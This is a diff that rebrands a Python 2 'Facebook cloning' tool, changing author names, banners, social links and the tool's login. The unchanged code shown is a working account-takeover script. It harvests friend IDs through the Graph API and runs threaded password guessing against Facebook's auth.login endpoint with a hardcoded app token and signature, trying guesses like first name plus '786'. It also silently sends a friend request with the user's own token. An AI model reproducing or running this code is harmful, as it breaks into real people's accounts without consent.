@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To MR-SH4DOW
+#The Credit For This Code Goes To SABA-ONFIRE
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -110,65 +110,37 @@ def phone():
 		login()
 	os.system('clear')		
 
-#Dev:MR-SH4DOW-ALONE
+#Dev:SABA-ONFIRE
 ##### LOGO #####
 logo = """
-\033[1;91m─────────█████
-\033[1;92m────────████████───█████
-\033[1;93m────────██████████████████
-\033[1;94m────────████████████████████
-\033[1;95m───────────██████████████████
-\033[1;96m──────────────████████████████
-\033[1;97m──────────────██████████████████
-\033[1;97m──────────────███████████████████
-\033[1;96m──────────────████████████████████
-\033[1;95m───────────────███─███████████████
-\033[1;94m───────────────███──██████████████
-\033[1;93m────────────────███───████████████
-\033[1;92m────────────────███──█████████████
-\033[1;91m────────────────███──█████████████
-\033[1;91m────────────────███─██████████████
-\033[1;92m────────────────███─██████████████
-\033[1;93m────────────────██──██████████████
-\033[1;94m────────────────██─███████──██████
-\033[1;95m───────────────██████████────█████
-\033[1;96m──────────███─██████████─────█████
-\033[1;97m─────███─█████████─█████──────█████
-\033[1;97m───████████████─█──█████───────████
-\033[1;96m──█████████████────█████───────█████
-\033[1;95m─███████████████────████───────█████
-\033[1;94m─███████████████────████────────█████
-\033[1;93m─████████████───────████────────█████
-\033[1;92m──██████████────────████─────────████
-\033[1;91m───████████─────────█████────────█████
-\033[1;92m─────█████─────────█████──────────████
-\033[1;93m─────────────────███████──────────████
-\033[1;94m───────────────███████  
+\033[1;91m███████╗ █████╗ ██████╗  █████╗ 
+\033[1;92m██╔════╝██╔══██╗██╔══██╗██╔══██╗
+\033[1;93m███████╗███████║██████╔╝███████║
+\033[1;91m╚════██║██╔══██║██╔══██╗██╔══██║
+\033[1;92m███████║██║  ██║██████╔╝██║  ██║
+\033[1;93m╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
+                                
+\033[1;91m██████╗ ███╗   ██╗    ███████╗██╗██████╗ ███████╗
+\033[1;91m██╔═══██╗████╗  ██║    ██╔════╝██║██╔══██╗██╔════╝
+\033[1;91m██║   ██║██╔██╗ ██║    █████╗  ██║██████╔╝█████╗  
+\033[1;91m██║   ██║██║╚██╗██║    ██╔══╝  ██║██╔══██╗██╔══╝  
+\033[1;91m╚██████╔╝██║ ╚████║    ██║     ██║██║  ██║███████╗
+\033[1;91m ╚═════╝ ╚═╝  ╚═══╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
+                                                  				
 \033[1;91m•───────────────────────────────────────────•
-
-\033[1;91m███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
-\033[1;95m██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
-\033[1;94m███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
-\033[1;96m╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
-\033[1;93m███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
-\033[1;92m╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ 
-                                                   
-
-\033[1;91m•───────────────────────────────────────────•
-\033[1;97m•-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------•
+\033[1;97m•-----------------\033[1;37mSABA ON FIRE\033[1;97m-----------------•
  \033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
-\033[1;41m\033[1;37m[⚡🔥\033[1;37mAuthor Name: MR-SH4DOW 🔥⚡\033[1;37m]\033[1;0m
-\033[1;41m\033[1;37m[⚡🔥\033[1;37m☏ →+923123879770 🔥⚡\033[1;37m]\033[1;0m
-\033[1;41m\033[1;37m[⚡🔥\033[1;37mYT Channel: Billu Tricker🔥⚡\033[1;37m]\033[1;0m
+\033[1;41m\033[1;37m[⚡🔥\033[1;37mAuthor Name: SABA 🔥⚡\033[1;37m]\033[1;0m
+\033[1;41m\033[1;37m[⚡🔥\033[1;37mYT Channel: AADI TECH🔥⚡\033[1;37m]\033[1;0m
 \033[1;41m\033[1;37m[⚡🔥 \033[1;37mFrom: Pakistan 🔥⚡\033[1;37m]\033[1;0m
 \033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
-\033[1;97m•-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------•
+\033[1;97m•-----------------\033[1;37mSABA-ONFIRE\033[1;97m-----------------•
 """
 
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\x1b[1;93mMR-SH4DOW█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)
+		print("\r\x1b[1;93mSABA-ONFIRE█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)
 
 
 back = 0
@@ -182,39 +154,58 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;91m───▄▀▀▀▀▀───▄█▀▀▀█▄
-\033[1;92m──▐▄▄▄▄▄▄▄▄██▌▀▄▀▐██
-\033[1;93m──▐▒▒▒▒▒▒▒▒███▌▀▐███
-\033[1;94m───▌▒▓▒▒▒▒▓▒██▌▀▐██
-\033[1;95m───▌▓▐▀▀▀▀▌▓─▀▀▀▀▀  
+\033[1;91m────▄▄▄▄▄▄─────▄▄▄▄▄▄
+\033[1;91m──▄█▓▓▓▓▓▓█▄─▄█▓▓▓▓▓▓█▄
+\033[1;91m─▐█▓▓▒▒▒▒▒▓▓█▓▓▒▒▒▒▒▓▓█▌
+\033[1;91m─█▓▓▒▒░╔╗╔═╦═╦═╦═╗░▒▒▓▓█
+\033[1;91m─█▓▓▒▒░║╠╣╬╠╗║╔╣╩╣░▒▒▓▓█
+\033[1;91m─▐█▓▓▒▒╚═╩═╝╚═╝╚═╝▒▒▓▓█▌
+\033[1;91m──▀█▓▓▒▒░░░░░░░░░▒▒▓▓█▀
+\033[1;91m────▀█▓▓▒▒░░░░░▒▒▓▓█▀
+\033[1;91m──────▀█▓▓▒▒░▒▒▓▓█▀
+\033[1;91m───────▀█▓▓▒▓▓█▀
+\033[1;91m─────────▀█▓█▀
+\033[1;91m───────────▀
+\033[1;91m─LOVE
 \033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
-\033[1;97m•───────────────────────────────────────────•
-\033[1;91m─────█─▄▀█──█▀▄─█─────\033[1;97m─────█─▄▀█──█▀▄─█───── 
-\033[1;91m────▐▌──────────▐▌────\033[1;97m────▐▌──────────▐▌────
-\033[1;91m────█▌▀▄──▄▄──▄▀▐█────\033[1;97m────█▌▀▄──▄▄──▄▀▐█────
-\033[1;91m───▐██──▀▀──▀▀──██▌───\033[1;97m───▐██──▀▀──▀▀──██▌───
-\033[1;91m──▄████▄──▐▌──▄████▄──\033[1;97m──▄████▄──▐▌──▄████▄──    
-\033[1;97m•───────────────────────────────────────────•                                                                                                                             
+\033[1;91m─_░▒███████
+\033[1;91m─░██▓▒░░▒▓██
+\033[1;91m─██▓▒░__░▒▓██___██████
+\033[1;91m─██▓▒░____░▓███▓__░▒▓██
+\033[1;91m─██▓▒░___░▓██▓_____░▒▓██
+\033[1;91m─██▓▒░_______________░▒▓██
+\033[1;91m─_██▓▒░______________░▒▓██
+\033[1;91m─__██▓▒░____________░▒▓██
+\033[1;91m─___██▓▒░__________░▒▓██
+\033[1;91m─____██▓▒░________░▒▓██
+\033[1;91m─_____██▓▒░_____░▒▓██
+\033[1;91m─______██▓▒░__░▒▓██
+\033[1;91m─_______█▓▒░░▒▓██
+\033[1;91m─________░▒▓██
+\033[1;91m─______░▒▓██
+\033[1;91m─____░▒▓██                                                                                                                  
 
-\033[1;96m  _______ ______          __  __ 
-\033[1;95m |__   __|  ____|   /\   |  \/  |
- \033[1;97m   | |  | |__     /  \  | \  / |
- \033[1;94m   | |  |  __|   / /\ \ | |\/| |
-  \033[1;93m  | |  | |____ / ____ \| |  | |
- \033[1;92m __|_|  |______/_/___ \_\_|_ |_|
-\033[1;91m |  __ \   /\   |  __ \| |/ /    
-\033[1;93m | |  | | /  \  | |__) | ' /     
- \033[1;95m| |  | |/ /\ \ |  _  /|  <      
- \033[1;94m| |__| / ____ \| | \ \| . \     
-\033[1;91m |_____/_/    \_\_|  \_\_|\_\    
-                                 
+\033[1;96m██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗
+\033[1;96m██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝
+\033[1;96m██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  
+\033[1;96m██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  
+\033[1;96m╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗
+\033[1;96m ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
+\033[1;96         m████████╗███████╗ █████╗ ███╗   ███╗
+\033[1;96m         ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
+\033[1;96m            ██║   █████╗  ███████║██╔████╔██║
+\033[1;96m            ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
+\033[1;96m            ██║   ███████╗██║  ██║██║ ╚═╝ ██║
+\033[1;96m            ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
+                                                                                                  
+							      
                                  
            
 \033[1;92m•───────────────────────────────────────────•
  \033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
  """
-CorrectUsername = "MRSH4DOW"
-CorrectPassword = "ALONE"
+CorrectUsername = "ULTIMATE"
+CorrectPassword = "TEAM"
 
 loop = 'true'
 while (loop == 'true'):
@@ -222,15 +213,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:MR-SH4DOW-ALONE
+            print "Logged in successfully as " + username #Dev:SABA-ONFIRE
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;97mWrong Password"
-            os.system('xdg-open https://www.youtube.com/c/BilluTricker')
+            os.system('xdg-open https://www.facebook.com/Akyoutuber06')
     else:
         print "\033[1;97mWrong Username"
-        os.system('xdg-open https://www.youtube.com/c/BilluTricker')
+        os.system('xdg-open https://www.facebook.com/Akyoutuber06')
 
 ##### LICENSE #####
 #=================#
@@ -247,7 +238,7 @@ def login():
         time.sleep(0.05)
         print "\033[1;93m[3]\033[1;47m\033[1;31mDownload Token App               \033[1;0m"
         time.sleep(0.05)
-        print "\033[1;94m[4]\033[1;47m\033[1;31mSubscribe billu Tricker      \033[1;0m"
+        print "\033[1;94m[4]\033[1;47m\033[1;31mSubscribe aadi tech              \033[1;0m"
         time.sleep(0.05)
 	print "\033[1;95m[5]\033[1;47m\033[1;31mJoin Whatsapp group For Help           \033[1;0m"
         time.sleep(0.05)
@@ -268,10 +259,10 @@ def pilih_login():
 	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
 	        login()
         elif peak =="4":
-	        os.system('xdg-open https://www.youtube.com/c/BilluTricker')
+	        os.system('xdg-open https://www.facebook.com/Akyoutuber06')
 	        login()
         elif peak =="5":
-	        os.system('xdg-open https://chat.whatsapp.com/DmAdpEsgjhr9Z5zSzwWuj6 ')
+	        os.system('xdg-open https://www.facebook.com/group/itz.chulbuli')
                 login()
 	elif peak =="0":
 		keluar()
@@ -288,7 +279,7 @@ def login1():
 		os.system('clear')
                 time.sleep(0.05)
 		print logo                
-		print "\033[1;97m•-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------•"
+		print "\033[1;97m•-----------------\033[1;37mSABA-ONFIRE\033[1;97m-----------------•"
 		print('\033[1;97m[+]\033[1;47m\033[1;31mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
 		print('	' )
 		id = raw_input('\033[1;97m[!] \x1b[1;97mNumber/Email\x1b[1;97m: \x1b[1;97m')
@@ -319,7 +310,7 @@ def login1():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\033[1;47m\033[1;91mMR-SH4DOW Login Successful\033[1;0m'
+				print '\033[1;47m\033[1;91mSABA Login Successful\033[1;0m'
 				os.system('xdg-open https://www.youtube.com/c/BilluTricker')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -372,12 +363,12 @@ def menu():
 	time.sleep(0.05)
 	print "\033[1;37m[•]\033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
 	time.sleep(0.05)
-	print "\033[1;97m•-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------•"
+	print "\033[1;97m•-----------------\033[1;37mSABA-ONFIRE\033[1;97m-----------------•"
 	print "\033[1;92m[1]\033[1;47m\033[1;31mStart Fast Cloning                          \033[1;0m"
 	time.sleep(0.05)
-	print "\033[1;93m[2]\033[1;47m\033[1;31mID Not Found Problem Solve                     \033[1;0m"
+	print "\033[1;93m[2]\033[1;47m\033[1;31mID Not Found Problem Solve                  \033[1;0m"
 	time.sleep(0.05)
-	print "\033[1;94m[3]\033[1;47m\033[1;31mRest/Update MR-SH4DOW                         \033[1;0m"
+	print "\033[1;94m[3]\033[1;47m\033[1;31mRest/Update AADI TECH                       \033[1;0m"
 	time.sleep(0.05)
 	print "\033[1;95m[0]\033[1;47m\033[1;31mExit                                      \033[1;0m"
 	time.sleep(0.05)
@@ -443,7 +434,7 @@ def pilih():
                 jalan('\033[1;96m========80%')
                 jalan('\033[1;95m=========90%')
                 jalan('\033[1;94m==========100%')
-                jalan('\033[1;93mCloning Data Reset and update by MR-SH4DOW')
+                jalan('\033[1;93mCloning Data Reset and update by SABA-ONFIRE')
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 	        menu()		
@@ -483,16 +474,16 @@ def pilih_super():
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
-		print "\033[1;97m•-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------•"
+		print "\033[1;97m•-----------------\033[1;37mSABA\033[1;97m-----------------•"
 		print logo
-		jalan('\033[1;97m[+]\033[1;91mMR-SH4DOW█████████████████▒▒▒▒▒▒▒▒..99%\033[1;97m:-:')
+		jalan('\033[1;97m[+]\033[1;91mSABA-ONFIRE█████████████████▒▒▒▒▒▒▒▒..99%\033[1;97m:-:')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
 			id.append(s['id'])
 	elif peak =="2":
 		os.system('clear')
-		print "\033[1;97m•-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------•"
+		print "\033[1;97m•-----------------\033[1;37mSABA-ONFIRE\033[1;97m-----------------•"
 		print logo
 		idt = raw_input("\033[1;97m[+]\033[1;91mEnter ID\033[1;97m: \033[1;97m")
 		try:
@@ -503,7 +494,7 @@ def pilih_super():
 			print"\033[1;97m[+]\x1b[1;91mID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		print"\033[1;97m[+]\033[1;91mMR-SH4DOW█████████████████▒▒▒▒▒▒▒▒..100%\033[1;97m:-:"
+		print"\033[1;97m[+]\033[1;91mSABA-ONFIRE█████████████████▒▒▒▒▒▒▒▒..100%\033[1;97m:-:"
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -528,7 +519,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:MR-SH4DOW-ALONE
+			pass #Dev:SABA-ONFIRE
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -598,7 +589,7 @@ def pilih_super():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = b['first_name'] + '1122'											
+						           pass4 = b['first_name'] + '786'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -686,7 +677,7 @@ def pilih_super():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 = '000786'									
+										                           pass8 = 'pakistan786'									
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:		
@@ -737,7 +728,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 #Dev:MR-SH4DOW-ALONE
-        print "\033[1;97m•-----------------\033[1;37m🔥MR-SH4DOW🔥\033[1;97m-----------------•"
+        print "\033[1;97m•-----------------\033[1;37m🔥saba-onfire🔥\033[1;97m-----------------•"
 	print '\033[1;97m[+]\033[1;47m \033[1;31mProcess Has Been Completed\033[1;0m'
 	print"\033[1;97m[+]\033[1;97mTotal \033[1;97mOK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
 	print "\033[1;97m«-----------------\033[1;37m🔥MR-SH4DOW🔥\033[1;97m-----------------»"
